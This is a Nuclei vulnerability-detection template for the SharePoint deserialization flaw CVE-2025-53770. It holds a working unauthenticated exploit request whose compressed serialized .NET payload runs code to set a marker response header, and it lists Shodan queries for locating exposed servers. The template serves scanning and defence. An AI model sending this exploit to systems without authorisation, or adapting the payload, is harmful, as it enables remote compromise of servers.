id: CVE-2025-53770

info:
  name: Microsoft Sharepoint - Deserialization of Untrusted Data
  severity: critical
  author: darses
  description: |
    Deserialization of untrusted data in on-premises Microsoft SharePoint Server allows an unauthorized attacker to execute code over a network.
  impact: |
    Unauthorized attackers can execute arbitrary code remotely, potentially leading to full system compromise.
  reference:
    - https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770
    - https://research.eye.security/sharepoint-under-siege/
    - https://github.com/projectdiscovery/nuclei-templates/blob/1a50aaaa7c2d8a81ed19db7828b10bcd5d6c5b94/code/cves/2021/CVE-2021-3156.yaml
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-53770
    cwe-id: CWE-502
  metadata:
    vendor: microsoft
    product: sharepoint_server
    shodan-query:
      - http.component:"Microsoft SharePoint"
      - "MicrosoftSharePointTeamServices: "
      - "SPRequestGuid: "
      - "X-SharePointHealthScore: "
  tags: rce,microsoft,sharepoint,cve,cve2025,kev

http:
  - method: POST
    path:
      - "{{BaseURL}}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"

    headers:
      Referer: "/_layouts/SignOut.aspx"
      User-Agent: "https://github.com/darses/nuclei-templates/blob/main/CVE-2025-53770.yaml"

    # In-memory .net object to set response header, copied from https://github.com/projectdiscovery/nuclei-templates/blob/1a50aaaa7c2d8a81ed19db7828b10bcd5d6c5b94/code/cves/2021/CVE-2021-3156.yaml
    # AddHeader("projectdiscovery", "project")
    body: |
      MSOTlPn_Uri=https%3A%2F%2Ftarget%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%0A++++%3C%25%40+Register+Tagprefix%3D%22Scorecard%22+Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22+Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C+Version%3D16.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D71e9bce111e9429c%22+%25%3E%0A++++%3C%25%40+Register+Tagprefix%3D%22asp%22+Namespace%3D%22System.Web.UI%22+Assembly%3D%22System.Web.Extensions%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D31bf3856ad364e35%22+%25%3E%0A%0A%3Casp%3AUpdateProgress+ID%3D%22UpdateProgress1%22+DisplayAfter%3D%2210%22+%0Arunat%3D%22server%22+AssociatedUpdatePanelID%3D%22upTest%22%3E%0A%3CProgressTemplate%3E%0A++%3Cdiv+class%3D%22divWaiting%22%3E++++++++++++%0A++++%3CScorecard%3AExcelDataSet+CompressedDataTable%3D%22H4sIAAAAAAAEAO1bW3OjSJbu3stE7Mzu0%2F4Bh1%2B7u4wuVFsVVRWRIITAEjaSAMFERww3g0wiVAIZSbF%2FZp%2F3R%2B6ezEQCucpuV%2FW0a3u3cCAw5OXkOd%2B55Mnku%2B%2B%2F%2B%2B67%2F4aDXMnxr%2F8AP9p0lxdh%2BqrvFu6PZ2a4zhfZ8l33FUf%2BfjwTN7jYrMN3y3BTrF3849nNxsML%2FyrczbIkXL7zfv7Z5X3%2BdavX6YbcZe%2BfSeP%2F3miT%2FkzDgvT1L%2FMUT%2F04TN2%2FwF1%2FcXsrr930%2B%2B%2FJuz%2F9I%2Fz855%2FfbvM3OS1ytk3xMn93fs5u3mzhPi6K1ZuLi7IsX5WdV9k6umhzXOtiPh6xZg9l0zyAXt%2Bdb9bLqrX8p3Thr7M8uy1%2B8rP0DZT7iZU6P1sE787zLA3Jf3lYnL%2F%2Ftz%2BfPTgIWSEO03BZnC3dNDytcMZaeqPk1WDfnRfrTXh8buShuFmvofIo810cVq8%2F0c%2BhLyBxhcPtbLcKHyl1LBlnCz88SxfLa9%2FfrIFJHPTrbg%2F%2FbZZetlkGYfBYd48PMQ7jR4n8MoIf1srDD5tw6T%2B3yqfJXJXLI6cJ%2FwkN784rCIoZxqFfAKbzV3K4DNcL%2F9VokRd%2Fa%2F31r02UTsP1PfAxf6Usi3C9dPErabtyCd%2Bstbtaheu%2FtY8VrNB7ZSivRlk%2ByNapW0CFH8%2Fqd1%2BiRVznlr%2F9%2BbbVCnjO7bi%2F%2FHjsa7EMsjJnRF57dzAWcnuzzu4XAen3Zh3mwAuXDHEA2hSW2Tr5AhI6Le%2B2c8m%2FdoPO627Y4X%2F55TimEwb9HWzEL7%2BcnxVUSCBLd7kjAjs%2FRfDFc0F08XkoouWfj1VavELbU3p4cVTEx3T61%2Ft9oi82SmrH3v%2Fpn8BO%2Ftd%2FvA3AekbrN%2Bzipl9k%2BFgd1sSv1Tl09NN965MGsmEPH%2BMBsSdnFd3E5s5cD9dGcp2V12uANDVgVanYzcXYXUYhgGKxzMN18bQdewu24OguFr%2FuL36CRgsXoFM7meAZXubXUPPAdFzfNk3Fx0r8AhSfPUc3DmRLDITP0cG3MAYynDCAGxhqseOeq7njsIizQAOL9b4PJmy9cPFiH769aDz%2FrJZuXGL9gMH553iTyvy8hAig8TcHsxe8yYv1Yhmdv78opd1iYCCkI4RuLuC4FNDxKEXya7Y03u9MsDfl567FJ14n2I8S595PW%2FuRKFjOXN27Vm9zM9M3Y7Fbju5QrkhayxtOWn5q9LzUbAVDNfbEMjKG5sKT8d20bfKm3Fs7Vrdn3%2Fkde2beaTN7ez0bc84Mda91g9KhmE%2F0nQy6U7m3D8RiFsgDztElUmViDNV7XzZ3wRCLthWIUC%2F2l8kQRQp5r6KSXC775He7S0gvj4xfp%2Fe39fj7XnubO5bGkfH6O37oWDz2U3w3SrYrKBONzcIzOngfyGYxSnoLNzXvAhi3N9fuvI6au5aSKwMH%2B0tt5bW7PY3xC%2FhWRnrHzIOhuXNmrY0zNzk%2FHeTAXz2wSD1t5Myx4bUL7N21Fto%2BiDVr3NLuJH68n%2BBxP%2BKhCh2TgHsr0r9fmrd%2BG7929Pg2SM0d3N97EcgaGCHqlBdX5EeMSCVEZU05iBLajqjrlF8CvSQye%2BbTZyIrp7JnGXtG%2BZqMyW9ft4eMzxLjJ23DF0WdIzdALvzKg1k41zjH4jZmu7dz207udfyN3u4VvtzbAG%2B5mdVLHKv8O%2FCM248tNR3vo5aWDpLx3gacjVsCHaPw4SgzHAC2itSTe51Rot17c%2BEe8LsJpNa9I5v5CGtE3jFg%2BLU9nxB6NjrBw9xZAd5mwVzdee0ghrZmjrXFdmdy7y%2BKGxt8L9w33hvrWVv9QLBktM2daw1yd77CzkDFDsOpBO2Vjl4UjtVagI5J0F%2Fsl%2BPBsMaj6aWYC82HNPEK4DRx5so1k88llQ%2BTrTSgGGHym9D3E9qfIERHQakSk6XBZOcfoSFO6CN1QMtKSqOtOXtPXwiiXrclM%2Fy4rK2s0VZO3w8ZXaNGWwF736UvGKi3R6wAPnJPBr2SAc%2FL8WYqD%2FbucBLb6RYLlO7V2GsPkkk6gDK9ndA6Ykdh2BrsgDc6rSdpRK66n%2FbarjXBfhQr9lzLDKo3E4KfvYCd2Bua2Cdtl2Mk6AZA7Al6DIqb2AedUweP2g710%2F3f5cYsukCUjdkV06HklvJjSplz06f8RETPxJn5QWe3jKdgvxAa0cq12n3GwWp2bzdRFxVoqSleJIBJjk05Xvk7oQQ6l6BjhSJrsZfy94EoLJypsAusbuTCOZF6M0UmumJs%2Bjp3pR5bFvQJEDMj4rxp70O5phERlC5A%2Fnp%2BoFg%2BvOosxkeyDmORDmRGB7wcHh8OsTkYyipdMVhhoS58rNBohB5KeQcPb44FryLxUYZRSstHX3%2FOQZTpYUcieSBFDx7ynDOPqSHlUc0f4djKw0YonRvQgZ1NSK3Gw%2Fh5yu%2F6YMwaLVUMthD4wTqqStL6YvRxLdKa%2Fonn4BGArdUtGw%2B0YaCMtHRN44yHUvgNR16CSLj6fyUjIhIXEZWmVxIbttoRYv2hQmRdeqUNz7KMECGmlwNWjti9dYh2XojETKjwIsM9tDamDNKxdqWTZvXDKOEY2hz1T3u0H88S%2BlzQhbwaPHSg%2FQBPclLnNeWENoP4aOWlwZ4WGeiEH5R%2BpWXOkELlRXtQuMCcGuRWtInUTVZfBBktGuMljQzJIJgd7r9WZ2NEbTb9n9pwBjXmlx%2F8f8BQdhwX%2BIYVEhW4Chbq2%2BTaJlcxEjOkcnCFkasHlkv1lbpXoKas%2BtXhv0GlmYptj2kMIiFJJxLqIpleM0I3vSq6yIF44NrXkCihK73vkqHDNSHvwdSNEAQecJ2hvoGET8CfHLgeXOOQkHwY38M3pRg0%2Fr0kcUgA%2FvwmEraenO3Gaau0dxCPyiWa6ELhtzWIG7YrG8xl5RfQwb%2BDvlI%2FhGpfMA0gtnGtFq5ijBX4jx2JAwKIJZ052Cvqp3Be%2BfMpxBJxCDEu9R3cgCN4sZcmxLzCsa3Kt8E9YEmGuMA4KVfTXQqNuMtcICmGcgL4p8quyAEOBr0%2BiVVIDFa9nzpzrYQye2hr6cwnt0Zq7kmc5rcNpFuTZCqbMfiyHZLMjUPECxGBHwn3SM4Q1LlDQx05SFih4RgBDfegJ%2BT5Dg2JjvRKNFSQVwofkGyQ9wz%2F6XV20%2BosZ1yoAgDsrr%2FHLR0pRWflm3HCdZWkr5DYRQQR6pGS93u3t9uhKd5lBIRTSQdrJCimMAV8691rEWR%2BsLFDqreCgWJnDj6tnKW9zWQeA%2F8FymfweTsy30CefncCjnH3rqklnz4a9u5wAE9hDiB58lazLbxBcmtvQ9zrWMbGkbeVfehfqDrox5dbQ6Gqa3%2FsTar3TD%2FLx9%2FTCx2eRR1leVoQ%2FtfoeGxklMItuYIOTNFgjKY6%2BE2pi%2BaloJLrJKr8KBJ7wvXFD%2BhxO39R31Kl%2FCRxE0YAMiMhJniB9lcIdBBwpCK5ixyCN3YklfExSDlbFzYEdx4i9XTk6gSX3WO7OZrmzHkJM%2FLep%2B1Ce6UgIzkh9TCS4BoJKZJJPA3GkJYHPvapc6RXDQkL5gSgSTqvbNbXCZ17JI9Z%2BxD4BkQfoD2v8pmU6X06eAFJNqEzJ%2FoA48VkHH55Wh763ZDyYP9KJHaZk%2B4DKcTOMno5Uh%2F6A7xJhI5retUFahJ92n6GxhHaIZkDTwB6Cu04xD%2FJFYCJoyeIlCifl1U7fUIHlOcJXS59HqHgKDniLjky%2Fpv6PaUnJu025Lb5bHpgcJQ%2Fg4N90VFQ2ZdP8umUP5tKPl0aNumCQHAB5THpD%2Bx3TuwReDqr4tue0l0CnY%2Fx%2B9vxf%2B0gqKGi7fa%2FSfjb8b%2F3EBDN7dzW%2BStz484nfCOnFNO8RBLfezLJL7BcwQTiRFvHVf5owvuyMdbn2p7kmrwhvrYhniSxuojsmFS4iOpc3UzGG3%2FKD7ylWThzleZdrlpBBvcY%2BqU5jonFtzzL3NmWmjsG5kg5EgPbfdWz6vyVGM4n2GpxuVLFQhC3Ln63nLLJ5Y2%2BIaZ2jvmYUTLY%2B22zgLHw0H8dzy%2FKyDzkTu84Nq8j9IhCH%2BYDHMTI%2BMbicTCfwFhJnlJo2aQeV2Dg673bNjc3ltLR2lLL3httmA%2FuNdkor%2FtQheVXZYVYG4lv5pN2zvT36jdhWXI256ty4ZnK8jSZUgVdVyKKWJw2oaVpDCcsyLyx30L4yMOxa%2FHbUWJuAsALxNAgB2NttmO4P%2BY%2FT3AyBXlDOQ7i4GiMG7lyrGInpeVZTvWIxeRrYOOJPD8%2BGY%2FdHzTxbIRzAb8YfqYvtq7A8rVTGp3qLH3D8MNAkqlXj%2BJn3MAPmef1b1Hrd8APmUfLB%2Fzw%2B1ESYMAB2ECSj222b56u0WBq%2B14IY63gpbAxGhSP5qcnUA%2FGt7J3vHq00%2FMJ0IS2VquuZ5L1h5fD2IvJoFpjoPkyiS1u0SUIUTcYdqflAcO0pBhFbK6HJJpu69PXdkF%2B%2BUj9Pfzis%2BwPq%2Ff%2FwP5Mt19NX0%2BxYjewQu9VNjtItkecHO0gNZkCy3vSGE0eEzhdXwq1zdquvKW0OcHEtJi7MvDK1DDVWenEdqlQ76Cru6%2Bmq015vPwa94kvkhuxjFDFMpr%2BmC9Kal90R%2BW3aqz7YnvBm9MpP3csleZC%2FbSXg%2B7pthVgR5qAvg1mXgf43zaYcO9Iv4J22sbfRd%2FKcdtuOXdBOp4NEm0mxOO2pMsNv8vGdsBbpLC1GDLO41m9k7yGzeIpQ8ymnWmRnC72lhPNa8MzkZecubZyIAabyCboVEB8BdGvRZVWpEsW02Mbv1%2BcytaFqU3WUJT8TOWOompvAk2XCkO91q8bct%2BfHHXCWILuyLhwaKzfuof7jbPj%2B6482IA9ILIVnHawcyy6Xi%2B5lb215ypfjfUHOtb2C9iaCQppl2ytXGX25pINGTX2WLC9Gsf1T4ScKp%2BK6bVaeF%2FU%2BjkhdmQJNgM%2FPiekUFFA3jnjhTEEe8S5ci8Zo3F%2FXK9bSCQmc9oDznl8z8G6bscEXzXZhdNeLZPUTI%2BxyILXqr0Nqpc694%2FThxkPDGptBbZphe0tYPlgTPc0IOa3E1aW2ecJ24NCf9kcByvsPS0mjPW6rSnlJ6b7ENDMaLTFqs9YDEBxyJiO2f4Kg8pJouue%2FXptpcGHGY23rO0qTNkazlTu5WSt5Iqr5QN%2BgKP7lCiwqZ8jexEO8yA5IPsW2mAAl5PYT8kaDSljCn4HfAXYz1DnOcAuWZuhccAsHRSOvoJYYZKBbtM5fd%2F6qD8B6Qqc0m%2BXs%2B5QDrX0OlcwAR2026e%2BSl9C3GMWXyUWfoC%2FmncvF%2BeqN2xvR3V16K4OGf96XkLALHczk3uxgzJJJ7AUf6tusb09DCvbmh8GH3uWoertbQzPKHZEk%2FgFPqbj11cz4hsAE8Tm7cSkRephn8Vn%2BnGOwQFmOxCvEqyVEsEZqM5Y6ZunMavV4lSmZgm1uaJJ1RRma%2BSf4BnyE%2BienytJ5QGP3nyayCblD%2F%2F8uoOP8lIr5mczgdoZtt1JtsjvuBRrG%2Bu0vFT7ls%2F4o8wnPtJBTHVQwDnzg2BjaTw9H18hg%2FgBgcUcJtuvdlqHriHap%2FMTgj9heLDD%2Fi5aCfjyWeWOeItqvFFPNrL7T%2BLtW%2F7jW%2F7jmTIQZxSzV9VVtgnWFF34o2FJSKk%2F1Ii%2BnsgxAv0htl%2Bi71W76VcsplMO1S%2FzCzFyah8rHT7Jy1yJieyQftXP5ivLbX5FvioSxJZSkx4lu2Kb%2BsAe0gkIW%2BFPq8X1OnaRA4u%2F%2B5bLem7uRL0H3mDb6n413XepOPkn9jKf4EB2qS7FmtdxYH5hdgPwVVO91jX3RNfonFWmezAEVfSgbccabBQJ5uKpeU32mhE98UrqSGsa0h7oiRl7C6HuR6x947ThG2n0OuKejsX%2BIHr3NXzjC%2Fu4h3OfHUUTGvzRfLVMvwVABd0HCe3tfPKNCMFmw%2B%2F4TV2YM7wG0SnWGd3CaTuAdWFJke08wGJE5v9zTmv5ZF%2F2Um%2FY5bK2y0tql2VkPmmXX9S%2BNjF32Bf7cuvslQwidhWW1C7ptX0g34ngNosdHJrf6SfaDmwV5xh4A%2FyKwaZgMRrQbY903o0wy0cyO6qGDM%2B0%2FUZ%2BtfruRwfMqZjkXKYWD30ONnbbyB7IFmRO5wirj3PrQh9wQfIsqrfUOBtk6UzjBxhKWF4rGtCcFMv3utRiqvh5%2BV6yf9gD%2B%2BxIuPpoK6G5Xklq5CFtlisUWfZRiui4a9lOOubKQTmDfFuCU4FzDKcOpwGnDacPZwRnAmcGZ7X19XhEQ6GELiJ2StubaXDd%2FcBN5NEPpRjt9Mu0V%2BajtxfV55PP%2Flr7Cz%2FVfMs%2BmlWqDy8bn1I2v6w9f%2F%2F24rTgs74I%2F%2BxPWN9efOYHvk9%2BOr4ql49%2BNE6%2BmP7kp%2BKPf2399uLBl%2BHv%2F%2FI%2FufAsz%2FlDAAA%3D%22+DataTable-CaseSensitive%3D%22false%22+runat%3D%22server%22%3E%0A%3C%2FScorecard%3AExcelDataSet%3E%0A++%3C%2Fdiv%3E%0A%3C%2FProgressTemplate%3E%0A%3C%2Fasp%3AUpdateProgress%3E%0A++++

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "projectdiscovery: project"
